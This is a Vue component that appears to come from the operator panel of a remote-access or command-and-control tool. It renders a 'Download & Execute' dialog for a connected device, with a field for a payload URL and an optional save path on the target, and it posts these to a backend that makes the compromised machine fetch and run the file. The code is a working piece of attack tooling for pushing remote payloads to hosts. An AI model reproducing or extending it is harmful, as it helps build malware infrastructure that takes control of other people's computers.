<template>
  <el-dialog
    :model-value="open"
    :title="'Download &amp; Execute - [' + (device.conn ? device.conn.slice(0,8) : '') + '] ' + device.hostname"
    width="480px"
    draggable
    destroy-on-close
    @close="$emit('cancel')"
  >
    <el-form :model="form" label-width="60px">
      <el-form-item label="URL">
        <el-input v-model="form.url" placeholder="https://example.com/payload.exe" />
      </el-form-item>
      <el-form-item label="Path">
        <el-input v-model="form.path" placeholder="Optional: save path on target" />
      </el-form-item>
    </el-form>
    <template #footer>
      <el-button @click="$emit('cancel')">Cancel</el-button>
      <el-button type="primary" :loading="loading" @click="onSubmit">Execute</el-button>
    </template>
  </el-dialog>
</template>

<script>
import { ref, reactive } from 'vue';
import { ElMessage } from 'element-plus';
import { request } from '../api/request.js';

export default {
  name: 'Executable',
  props: {
    device: { type: Object, required: true },
    open:   { type: Boolean, default: false },
  },
  emits: ['cancel'],
  setup(props, { emit }) {
    const loading = ref(false);
    const form = reactive({ url: '', path: '' });

    async function onSubmit() {
      if (!form.url.trim()) return;
      loading.value = true;
      try {
        const res = await request('/api/device/executable', {
          uuid: props.device.conn,
          url:    form.url,
          path:   form.path,
        });
        if (res.data.code === 0) {
          ElMessage.success('Execution triggered');
          emit('cancel');
        }
      } finally {
        loading.value = false;
      }
    }

    return { form, loading, onSubmit };
  },
};
</script>
